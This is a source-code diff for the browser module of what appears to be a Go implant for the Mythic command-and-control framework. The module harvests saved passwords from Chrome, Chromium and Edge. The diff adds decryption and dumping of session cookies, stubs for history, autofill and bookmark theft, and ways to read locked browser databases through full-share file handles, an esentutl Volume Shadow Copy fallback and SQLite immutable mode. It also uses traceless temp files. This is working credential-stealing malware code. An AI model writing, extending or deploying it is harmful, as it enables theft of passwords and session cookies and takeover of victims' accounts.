@@ -17,8 +17,6 @@ import (
 
 	"fawkes/pkg/structs"
 
-	_ "modernc.org/sqlite"
-
 	"golang.org/x/sys/windows"
 )
 
@@ -32,16 +30,22 @@ func (c *BrowserCommand) Description() string {
 	return "Harvest saved credentials from Chromium-based browsers (Chrome, Edge)"
 }
 
-type browserArgs struct {
-	Action  string `json:"action"`  // passwords (default), cookies
-	Browser string `json:"browser"` // all (default), chrome, edge
-}
-
 type browserCred struct {
 	Browser  string
 	URL      string
 	Username string
 	Password string
+}
+
+type browserCookie struct {
+	Browser  string
+	Host     string
+	Name     string
+	Value    string
+	Path     string
+	Expires  int64
+	Secure   bool
+	HTTPOnly bool
 }
 
 func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
@@ -64,12 +68,16 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 	switch strings.ToLower(args.Action) {
 	case "passwords":
 		return browserPasswords(args)
+	case "cookies":
+		return browserCookies(args)
+	case "history":
+		return browserHistory(args)
+	case "autofill":
+		return browserAutofill(args)
+	case "bookmarks":
+		return browserBookmarks(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: passwords", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks", args.Action)
 	}
 }
 
@@ -81,13 +89,16 @@ func browserPaths(browser string) map[string]string {
 	}
 
 	all := map[string]string{
-		"Chrome": filepath.Join(localAppData, "Google", "Chrome", "User Data"),
-		"Edge":   filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
+		"Chrome":   filepath.Join(localAppData, "Google", "Chrome", "User Data"),
+		"Chromium": filepath.Join(localAppData, "Chromium", "User Data"),
+		"Edge":     filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
 	}
 
 	switch strings.ToLower(browser) {
 	case "chrome":
 		return map[string]string{"Chrome": all["Chrome"]}
+	case "chromium":
+		return map[string]string{"Chromium": all["Chromium"]}
 	case "edge":
 		return map[string]string{"Edge": all["Edge"]}
 	default:
@@ -197,22 +208,43 @@ func decryptPassword(encryptedPassword []byte, key []byte) (string, error) {
 	return string(plaintext), nil
 }
 
-// copyFile copies src to dst for safe reading of locked databases
+// copyFile copies src to dst for safe reading of locked databases.
+// First tries CreateFileW with full sharing flags to bypass browser locks.
+// Falls back to esentutl /y /vss which uses Volume Shadow Copy for
+// exclusively-locked files (Chrome/Edge lock Cookies DB while running).
 func copyFile(src, dst string) error {
-	in, err := os.Open(src)
+	srcPtr, err := windows.UTF16PtrFromString(src)
 	if err != nil {
 		return err
 	}
-	defer in.Close()
-
-	out, err := os.Create(dst)
-	if err != nil {
-		return err
+	h, err := windows.CreateFile(
+		srcPtr,
+		windows.GENERIC_READ,
+		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
+		nil,
+		windows.OPEN_EXISTING,
+		windows.FILE_ATTRIBUTE_NORMAL,
+		0,
+	)
+	if err == nil {
+		in := os.NewFile(uintptr(h), src)
+		defer in.Close()
+		out, outErr := os.Create(dst)
+		if outErr != nil {
+			return outErr
+		}
+		defer out.Close()
+		_, copyErr := io.Copy(out, in)
+		return copyErr
 	}
-	defer out.Close()
 
-	_, err = io.Copy(out, in)
-	return err
+	// Fallback: esentutl /y /vss copies via Volume Shadow Copy
+	_, vssErr := execCmdTimeout("esentutl", "/y", "/vss", src, "/d", dst)
+	if vssErr == nil {
+		return nil
+	}
+	// Return original CreateFile error as it's more descriptive
+	return fmt.Errorf("open %s: %w (VSS fallback also failed: %v)", filepath.Base(src), err, vssErr)
 }
 
 // findProfiles returns profile directories containing Login Data
@@ -245,60 +277,66 @@ func findProfiles(userDataDir string) []string {
 func browserPasswords(args browserArgs) structs.CommandResult {
 	paths := browserPaths(args.Browser)
 	if paths == nil {
-		return structs.CommandResult{
-			Output:    "Could not determine LOCALAPPDATA path",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Could not determine LOCALAPPDATA path")
 	}
 
 	var allCreds []browserCred
 	var errors []string
 
 	for browserName, userDataDir := range paths {
-		// Check if browser is installed
-		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
-			continue
-		}
-
-		// Get the encryption key
-		key, err := getEncryptionKey(userDataDir)
-		if err != nil {
-			errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
-			continue
-		}
-
-		// Find all profiles
-		profiles := findProfiles(userDataDir)
-		if len(profiles) == 0 {
-			errors = append(errors, fmt.Sprintf("%s: no profiles with Login Data found", browserName))
-			continue
-		}
-
-		for _, profileDir := range profiles {
-			loginDataPath := filepath.Join(profileDir, "Login Data")
-
-			// Copy to temp file to avoid database lock — random name (no distinctive pattern)
-			tf, tfErr := os.CreateTemp("", "")
-			if tfErr != nil {
-				errors = append(errors, fmt.Sprintf("%s (%s): create temp: %v", browserName, filepath.Base(profileDir), tfErr))
-				continue
-			}
-			tmpFile := tf.Name()
-			tf.Close()
-			if err := copyFile(loginDataPath, tmpFile); err != nil {
-				errors = append(errors, fmt.Sprintf("%s (%s): copy Login Data: %v", browserName, filepath.Base(profileDir), err))
-				continue
+		func() {
+			// Check if browser is installed
+			if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+				return
 			}
 
-			creds, err := readLoginData(tmpFile, key, browserName, filepath.Base(profileDir))
-			os.Remove(tmpFile)
+			// Get the encryption key
+			key, err := getEncryptionKey(userDataDir)
 			if err != nil {
-				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, filepath.Base(profileDir), err))
-				continue
+				errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
+				return
 			}
-			allCreds = append(allCreds, creds...)
-		}
+			defer structs.ZeroBytes(key)
+
+			// Find all profiles
+			profiles := findProfiles(userDataDir)
+			if len(profiles) == 0 {
+				errors = append(errors, fmt.Sprintf("%s: no profiles with Login Data found", browserName))
+				return
+			}
+
+			for _, profileDir := range profiles {
+				loginDataPath := filepath.Join(profileDir, "Login Data")
+				profileName := filepath.Base(profileDir)
+
+				// Strategy 1: Copy DB to temp file, open from copy
+				tf, tfErr := os.CreateTemp("", "")
+				if tfErr == nil {
+					tmpFile := tf.Name()
+					tf.Close()
+					if copyErr := copyFile(loginDataPath, tmpFile); copyErr == nil {
+						creds, readErr := readLoginData(tmpFile, key, browserName, profileName)
+						secureRemove(tmpFile)
+						if readErr == nil {
+							allCreds = append(allCreds, creds...)
+							continue
+						}
+						errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
+						continue
+					}
+					secureRemove(tmpFile)
+				}
+
+				// Strategy 2: Open locked DB directly in immutable mode
+				immutableURI := "file:///" + filepath.ToSlash(loginDataPath) + "?immutable=1"
+				creds, err := readLoginData(immutableURI, key, browserName, profileName)
+				if err != nil {
+					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
+					continue
+				}
+				allCreds = append(allCreds, creds...)
+			}
+		}()
 	}
 
 	// Format output
@@ -350,6 +388,12 @@ func browserPasswords(args browserArgs) structs.CommandResult {
 	if len(mythicCreds) > 0 {
 		result.Credentials = &mythicCreds
 	}
+
+	// Zero decrypted passwords from local credential cache
+	for i := range allCreds {
+		structs.ZeroString(&allCreds[i].Password)
+	}
+
 	return result
 }
 
@@ -401,6 +445,239 @@ func readLoginData(dbPath string, key []byte, browserName, profileName string) (
 			Password: password,
 		})
 	}
+	if err := rows.Err(); err != nil {
+		return creds, fmt.Errorf("row iteration error: %v", err)
+	}
 
 	return creds, nil
 }
+
+// findCookieProfiles returns profile directories containing Cookies or Network/Cookies
+func findCookieProfiles(userDataDir string) []string {
+	var profiles []string
+
+	checkProfile := func(dir string) {
+		// Chrome 96+ stores cookies in Network/Cookies
+		networkCookies := filepath.Join(dir, "Network", "Cookies")
+		if _, err := os.Stat(networkCookies); err == nil {
+			profiles = append(profiles, dir)
+			return
+		}
+		// Older versions store in profile/Cookies
+		cookies := filepath.Join(dir, "Cookies")
+		if _, err := os.Stat(cookies); err == nil {
+			profiles = append(profiles, dir)
+		}
+	}
+
+	checkProfile(filepath.Join(userDataDir, "Default"))
+
+	entries, err := os.ReadDir(userDataDir)
+	if err != nil {
+		return profiles
+	}
+	for _, entry := range entries {
+		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
+			checkProfile(filepath.Join(userDataDir, entry.Name()))
+		}
+	}
+
+	return profiles
+}
+
+// cookieDBPath returns the path to the Cookies database for a profile
+func cookieDBPath(profileDir string) string {
+	// Chrome 96+ path
+	networkPath := filepath.Join(profileDir, "Network", "Cookies")
+	if _, err := os.Stat(networkPath); err == nil {
+		return networkPath
+	}
+	return filepath.Join(profileDir, "Cookies")
+}
+
+func browserCookies(args browserArgs) structs.CommandResult {
+	paths := browserPaths(args.Browser)
+	if paths == nil {
+		return errorResult("Could not determine LOCALAPPDATA path")
+	}
+
+	var allCookies []browserCookie
+	var errors []string
+
+	for browserName, userDataDir := range paths {
+		func() {
+			if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
+				return
+			}
+
+			key, err := getEncryptionKey(userDataDir)
+			if err != nil {
+				errors = append(errors, fmt.Sprintf("%s: %v", browserName, err))
+				return
+			}
+			defer structs.ZeroBytes(key)
+
+			profiles := findCookieProfiles(userDataDir)
+			if len(profiles) == 0 {
+				errors = append(errors, fmt.Sprintf("%s: no profiles with Cookies found", browserName))
+				return
+			}
+
+			for _, profileDir := range profiles {
+				dbPath := cookieDBPath(profileDir)
+				profileName := filepath.Base(profileDir)
+
+				// Strategy 1: Copy DB to temp file, open from copy
+				tf, tfErr := os.CreateTemp("", "")
+				if tfErr == nil {
+					tmpFile := tf.Name()
+					tf.Close()
+					if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
+						cookies, readErr := readCookieData(tmpFile, key, browserName, profileName)
+						secureRemove(tmpFile)
+						if readErr == nil {
+							allCookies = append(allCookies, cookies...)
+							continue
+						}
+						errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, readErr))
+						continue
+					}
+					secureRemove(tmpFile)
+				}
+
+				// Strategy 2: Open locked DB directly in immutable mode (no locking)
+				// URI format tells SQLite the file won't change, skipping all locks
+				immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
+				cookies, err := readCookieData(immutableURI, key, browserName, profileName)
+				if err != nil {
+					errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
+					continue
+				}
+				allCookies = append(allCookies, cookies...)
+			}
+		}()
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("=== Browser Cookies (%d found) ===\n\n", len(allCookies)))
+
+	for _, c := range allCookies {
+		flags := ""
+		if c.Secure {
+			flags += " Secure"
+		}
+		if c.HTTPOnly {
+			flags += " HttpOnly"
+		}
+		sb.WriteString(fmt.Sprintf("[%s] %s  %s=%s  (path=%s%s)\n",
+			c.Browser, c.Host, c.Name, truncStr(c.Value, 80), c.Path, flags))
+	}
+
+	if len(errors) > 0 {
+		sb.WriteString("\n--- Errors ---\n")
+		for _, e := range errors {
+			sb.WriteString(fmt.Sprintf("  %s\n", e))
+		}
+	}
+
+	if len(allCookies) == 0 && len(errors) == 0 {
+		sb.WriteString("No Chromium-based browsers found or no cookies.\n")
+	}
+
+	return successResult(sb.String())
+}
+
+func readCookieData(dbPath string, key []byte, browserName, profileName string) ([]browserCookie, error) {
+	db, err := sql.Open("sqlite", dbPath)
+	if err != nil {
+		return nil, fmt.Errorf("open database: %w", err)
+	}
+	defer db.Close()
+
+	rows, err := db.Query("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 0")
+	if err != nil {
+		return nil, fmt.Errorf("query cookies: %w", err)
+	}
+	defer rows.Close()
+
+	var cookies []browserCookie
+	label := browserName
+	if profileName != "Default" {
+		label = fmt.Sprintf("%s (%s)", browserName, profileName)
+	}
+
+	var total, decryptFails int
+	for rows.Next() {
+		var host, name, path string
+		var encValue []byte
+		var expiresUTC int64
+		var isSecure, isHTTPOnly int
+
+		if err := rows.Scan(&host, &name, &encValue, &path, &expiresUTC, &isSecure, &isHTTPOnly); err != nil {
+			continue
+		}
+
+		if len(encValue) == 0 {
+			continue
+		}
+
+		total++
+		value, err := decryptPassword(encValue, key)
+		if err != nil || value == "" {
+			decryptFails++
+			continue
+		}
+
+		cookies = append(cookies, browserCookie{
+			Browser:  label,
+			Host:     host,
+			Name:     name,
+			Value:    value,
+			Path:     path,
+			Expires:  expiresUTC,
+			Secure:   isSecure != 0,
+			HTTPOnly: isHTTPOnly != 0,
+		})
+	}
+	if err := rows.Err(); err != nil {
+		return cookies, fmt.Errorf("row iteration error: %v", err)
+	}
+
+	if decryptFails > 0 && len(cookies) == 0 {
+		return cookies, fmt.Errorf("all %d cookies failed to decrypt (Chrome 127+/Edge App-Bound Encryption may be active)", total)
+	}
+
+	return cookies, nil
+}
+
+// openBrowserDB opens a browser SQLite database using the copy+fallback pattern.
+// Returns (db, cleanup func, error). Caller must call cleanup when done.
+func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
+	// Strategy 1: Copy DB to temp file
+	tf, tfErr := os.CreateTemp("", "")
+	if tfErr == nil {
+		tmpFile := tf.Name()
+		tf.Close()
+		if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
+			db, err := sql.Open("sqlite", tmpFile)
+			if err == nil {
+				cleanup := func() {
+					db.Close()
+					secureRemove(tmpFile)
+				}
+				return db, cleanup, nil
+			}
+		}
+		secureRemove(tmpFile)
+	}
+
+	// Strategy 2: Open in immutable mode
+	immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
+	db, err := sql.Open("sqlite", immutableURI)
+	if err != nil {
+		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), err)
+	}
+	cleanup := func() { db.Close() }
+	return db, cleanup, nil
+}
+
